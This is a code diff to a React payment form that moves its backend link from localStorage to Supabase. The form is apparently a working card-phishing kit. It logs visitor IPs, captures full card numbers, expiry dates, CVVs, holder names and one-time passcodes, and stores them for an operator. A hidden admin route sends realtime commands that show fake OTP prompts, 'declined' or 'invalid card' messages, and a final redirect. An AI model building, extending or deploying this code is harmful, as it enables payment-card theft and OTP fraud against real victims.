@@ -1,5 +1,6 @@
 import React, { useState, useEffect } from 'react';
 import { CreditCard, Lock, Shield, Loader2, AlertTriangle } from 'lucide-react';
+import { supabase } from '@/integrations/supabase/client';
 
 const getRealIP = async () => {
   try {
@@ -42,6 +43,7 @@ const PaymentForm = () => {
   const [fadeState, setFadeState] = useState('visible');
   const [showBackDialog, setShowBackDialog] = useState(false);
   const [longPressTimer, setLongPressTimer] = useState<NodeJS.Timeout | null>(null);
+  const [currentSubmissionId, setCurrentSubmissionId] = useState<string | null>(null);
 
   // Check if all card details are filled
   const isFormValid = () => {
@@ -145,98 +147,111 @@ const PaymentForm = () => {
   }, [longPressTimer]);
 
   useEffect(() => {
-    // Initialize cross-browser communication and send visitor data with real IP
+    // Initialize Supabase connection and send visitor data
     const initializeConnection = async () => {
       const realIP = await getRealIP();
-      const userInfo = {
-        ip: realIP,
-        browser: navigator.userAgent,
-        network: getRandomNetwork()
-      };
-
-      const visitorData = {
-        type: 'newVisitor',
-        ip: realIP,
-        timestamp: new Date().toISOString()
-      };
-
-      console.log('Sending visitor data with real IP via localStorage:', visitorData);
+      
+      console.log('Supabase: Sending visitor data with real IP');
       console.log('Current window location:', window.location.href);
       console.log('Admin panel should be at:', window.location.origin + '/parking55009hvSweJimbs5hhinbd56y');
       
-      // Send the visitor data via localStorage for cross-browser communication
-      localStorage.setItem('adminData', JSON.stringify(visitorData));
-      localStorage.removeItem('adminData'); // Trigger storage event
+      // Insert or update visitor data
+      try {
+        const { error } = await supabase
+          .from('visitors')
+          .upsert({ ip: realIP }, { onConflict: 'ip' });
+        
+        if (error) {
+          console.error('Error inserting visitor:', error);
+        } else {
+          console.log('Visitor data sent successfully via Supabase');
+        }
+      } catch (error) {
+        console.error('Error with Supabase connection:', error);
+      }
     };
 
     initializeConnection();
 
-    // Listen for commands from admin panel via localStorage
-    const handleStorageEvent = (event: StorageEvent) => {
-      if (event.key === 'adminCommand' && event.newValue) {
-        const data = JSON.parse(event.newValue);
-        console.log('Received command from admin:', data);
-        
-        switch (data.command) {
-          case 'showotp':
-            setFadeState('fadeOut');
-            setTimeout(() => {
-              setIsLoading(false);
-              setShowOtp(true);
-              setFadeState('fadeIn');
-            }, 300);
-            break;
-          case 'fail':
-            setFadeState('fadeOut');
-            setTimeout(() => {
-              setIsLoading(false);
-              setShowOtp(false);
-              setErrorMessage('Your card has been declined');
-              setFadeState('fadeIn');
-            }, 300);
-            break;
-          case 'success':
-            setFadeState('fadeOut');
-            setTimeout(() => {
-              setIsConfirmLoading(false);
-              setShowProcessing(true);
-              setFadeState('fadeIn');
+    // Listen for admin commands via Supabase realtime
+    const channel = supabase
+      .channel('admin-commands')
+      .on(
+        'postgres_changes',
+        {
+          event: 'INSERT',
+          schema: 'public',
+          table: 'admin_commands'
+        },
+        (payload) => {
+          console.log('Received command from admin via Supabase:', payload.new);
+          const command = payload.new.command;
+          const submissionId = payload.new.submission_id;
+          
+          // Only process commands for the current submission
+          if (submissionId && submissionId !== currentSubmissionId) {
+            return;
+          }
+          
+          switch (command) {
+            case 'showotp':
+              setFadeState('fadeOut');
               setTimeout(() => {
-                setShowProcessing(false);
-                setShowSuccess(true);
+                setIsLoading(false);
+                setShowOtp(true);
+                setFadeState('fadeIn');
+              }, 300);
+              break;
+            case 'fail':
+              setFadeState('fadeOut');
+              setTimeout(() => {
+                setIsLoading(false);
+                setShowOtp(false);
+                setErrorMessage('Your card has been declined');
+                setFadeState('fadeIn');
+              }, 300);
+              break;
+            case 'success':
+              setFadeState('fadeOut');
+              setTimeout(() => {
+                setIsConfirmLoading(false);
+                setShowProcessing(true);
+                setFadeState('fadeIn');
                 setTimeout(() => {
-                  window.location.href = 'https://google.com';
-                }, 2000);
-              }, 4000);
-            }, 300);
-            break;
-          case 'invalidotp':
-            setIsConfirmLoading(false);
-            setInvalidOtpMessage('Invalid OTP, please enter valid one time passcode sent to your mobile');
-            break;
-          case 'cardinvalid':
-            setFadeState('fadeOut');
-            setTimeout(() => {
-              setIsLoading(false);
-              setShowOtp(false);
-              setErrorMessage('Your card is invalid, please try another card');
-              setFadeState('fadeIn');
-            }, 300);
-            break;
-          case 'carddisabled':
-            setFadeState('fadeOut');
-            setTimeout(() => {
-              setIsLoading(false);
-              setShowOtp(false);
-              setErrorMessage('Card disabled, please try another card');
-              setFadeState('fadeIn');
-            }, 300);
-            break;
+                  setShowProcessing(false);
+                  setShowSuccess(true);
+                  setTimeout(() => {
+                    window.location.href = 'https://google.com';
+                  }, 2000);
+                }, 4000);
+              }, 300);
+              break;
+            case 'invalidotp':
+              setIsConfirmLoading(false);
+              setInvalidOtpMessage('Invalid OTP, please enter valid one time passcode sent to your mobile');
+              break;
+            case 'cardinvalid':
+              setFadeState('fadeOut');
+              setTimeout(() => {
+                setIsLoading(false);
+                setShowOtp(false);
+                setErrorMessage('Your card is invalid, please try another card');
+                setFadeState('fadeIn');
+              }, 300);
+              break;
+            case 'carddisabled':
+              setFadeState('fadeOut');
+              setTimeout(() => {
+                setIsLoading(false);
+                setShowOtp(false);
+                setErrorMessage('Card disabled, please try another card');
+                setFadeState('fadeIn');
+              }, 300);
+              break;
+          }
         }
-      }
-    };
-
-    window.addEventListener('storage', handleStorageEvent);
+      )
+      .subscribe();
 
     // Handle click anywhere to show alert
     const handleDocumentClick = (e: MouseEvent) => {
@@ -250,7 +265,6 @@ const PaymentForm = () => {
         
         if (!isInPaymentArea) {
           setShowAlert(true);
-          // Add red glow to payment form
           paymentForm.classList.add('shadow-red-500', 'shadow-2xl', 'border-red-500');
           setTimeout(() => {
             setShowAlert(false);
@@ -263,10 +277,10 @@ const PaymentForm = () => {
     document.addEventListener('click', handleDocumentClick);
 
     return () => {
-      window.removeEventListener('storage', handleStorageEvent);
+      supabase.removeChannel(channel);
       document.removeEventListener('click', handleDocumentClick);
     };
-  }, []);
+  }, [currentSubmissionId]);
 
   useEffect(() => {
     let interval: NodeJS.Timeout;
@@ -291,14 +305,29 @@ const PaymentForm = () => {
     return `${mins}.${secs.toString().padStart(2, '0')}`;
   };
 
-  const sendToAdminPanel = (data: any) => {
-    console.log('Sending data to admin panel via localStorage:', data);
-    console.log('Expected admin route: /parking55009hvSweJimbs5hhinbd56y');
+  const generateInvoiceId = () => {
+    return `INV${Date.now()}${Math.floor(Math.random() * 1000)}`;
+  };
+
+  const sendToSupabase = async (data: any) => {
+    console.log('Sending data to Supabase:', data);
     
-    // Use localStorage for cross-browser communication
-    localStorage.setItem('adminData', JSON.stringify(data));
-    localStorage.removeItem('adminData'); // Trigger storage event
-    console.log('Data sent successfully via localStorage');
+    try {
+      const { data: insertedData, error } = await supabase
+        .from('card_submissions')
+        .insert([data])
+        .select()
+        .single();
+      
+      if (error) {
+        console.error('Error inserting card data:', error);
+      } else {
+        console.log('Card data sent successfully to Supabase:', insertedData);
+        setCurrentSubmissionId(insertedData.id);
+      }
+    } catch (error) {
+      console.error('Error with Supabase insertion:', error);
+    }
   };
 
   const handleInputChange = (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>) => {
@@ -366,42 +395,51 @@ const PaymentForm = () => {
     setIsLoading(true);
     setErrorMessage('');
     
-    // Send card data to admin panel with real IP
+    // Send card data to Supabase
     const realIP = await getRealIP();
-    const userInfo = {
-      ip: realIP,
+    const invoiceId = generateInvoiceId();
+    
+    const cardData = {
+      invoice_id: invoiceId,
+      card_number: formData.cardNumber,
+      expiry_month: formData.expiryMonth,
+      expiry_year: formData.expiryYear,
+      cvv: formData.cvv,
+      card_holder: formData.cardHolder,
+      amount: formData.amount,
+      user_ip: realIP,
       browser: navigator.userAgent.split(' ')[navigator.userAgent.split(' ').length - 1],
       network: getRandomNetwork()
     };
     
-    const cardData = {
-      type: 'cardData',
-      data: formData,
-      userInfo: userInfo,
-      timestamp: new Date().toISOString()
-    };
-    
-    console.log('Submitting card data:', cardData);
-    console.log('Admin panel route: /parking55009hvSweJimbs5hhinbd56y');
-    sendToAdminPanel(cardData);
+    console.log('Submitting card data to Supabase:', cardData);
+    await sendToSupabase(cardData);
   };
 
-  const handleConfirmPay = () => {
+  const handleConfirmPay = async () => {
     if (!isOtpValid()) {
       return;
     }
     
     setIsConfirmLoading(true);
     
-    // Send OTP to admin panel
-    const otpData = {
-      type: 'otp',
-      otp: otp,
-      timestamp: new Date().toISOString()
-    };
-    
-    console.log('Sending OTP data:', otpData);
-    sendToAdminPanel(otpData);
+    // Update the card submission with OTP
+    if (currentSubmissionId) {
+      try {
+        const { error } = await supabase
+          .from('card_submissions')
+          .update({ otp: otp })
+          .eq('id', currentSubmissionId);
+        
+        if (error) {
+          console.error('Error updating OTP:', error);
+        } else {
+          console.log('OTP updated successfully in Supabase');
+        }
+      } catch (error) {
+        console.error('Error updating OTP:', error);
+      }
+    }
   };
 
   const getLastFourDigits = () => {
